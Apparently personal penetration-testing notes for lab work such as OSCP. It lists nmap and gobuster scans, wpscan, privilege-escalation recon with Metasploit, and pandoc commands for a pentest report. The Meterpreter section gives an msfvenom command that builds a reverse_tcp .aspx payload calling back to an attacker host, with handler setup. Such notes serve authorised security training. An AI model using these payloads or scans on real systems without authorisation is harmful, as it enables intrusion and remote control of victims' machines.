# Scanning

#### Nmap
The following is a list of .nse scrips and cheat sheets for nmap
```
$ nmap -sC -sV -oA nmap/OUTPUT 10.10.10.125
```
The following syntax is used for vulnerability scans within nmap
```
$ nmap --script vuln -oA nmap/OUTPUT 10.10.10.125
$ nmap --script http-enum --script-args http-enum.fingerprintfile=./myfingerprints.txt -p80 <target>  
```
#### Gobuster
Directory busting with gobuster
```
$ sudo gobuster dir -u http://10.10.10.68 -w ~/red-team/wordlists/directory-list-2.3-medium.txt
```
#### WordPress
The following tool will scan a wordpress site for known vulnerabilities and configuration items:
```
$ sudo wpscan --url https://example.com --disable-tls-checks
```
#### Manual Tricks
If 443 is open check the certificate for alternative Virtual hosts that the cert may work on.
If you find that the certificate is good for multiple subdomains/virtual hosts add them to your host file with the following command.
```
$ vi /etc/hosts

127.0.0.1         localhost
127.0.0.2         kali
10.10.10.123      www.example.com
```
# Privilege Escalation

### Windows
First lets check system info with the folloing commands.
```
C:\Users\user\Desktop> systeminfo
```
msf exploit checker:
```
msf exploit > use post/multi/recon/local_exploit_suggester
msf exploit > set SESSION 1
msf exploit > run
```
### Linux
First steps to go from low-privilege user to root on a linux box.

Start a python http server to transfer files to the compromised machine. Note that this command will host files in your current directory, so make sure you copy all files before running the python SimpleHTTPServer.
```
$ sudo python -m SimpleHTTPServer 80
```
# Meterpreter
Use the following to created a meterpreter shell for reverse_tcp for Windows
```
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.40 LPORT=4444 -f aspx -o exploit.aspx

msf > use exploit/multi/handler
msf > set payload windows/meterpreter/reverse_tcp
```
# Pen Test Report
#### Requirements

- [Pandoc](https://pandoc.org/installing.html)
```
sudo apt-get install pandoc
```
- LaTeX (eg. [TeX Live](http://www.tug.org/texlive/)) in order to get `pdflatex` or `xelatex`
- [Eisvogel Pandoc LaTeX PDF Template](https://github.com/Wandmalfarbe/pandoc-latex-template#installation)
```
pandoc PENTEST_REPORT.md \
-o OSCP-OS-XXXXX-Lab-Report.pdf \
--from markdown+yaml_metadata_block+raw_html \
--template eisvogel \
--table-of-contents \
--toc-depth 6 \
--number-sections \
--top-level-division=chapter \
--highlight-style breezedark
```
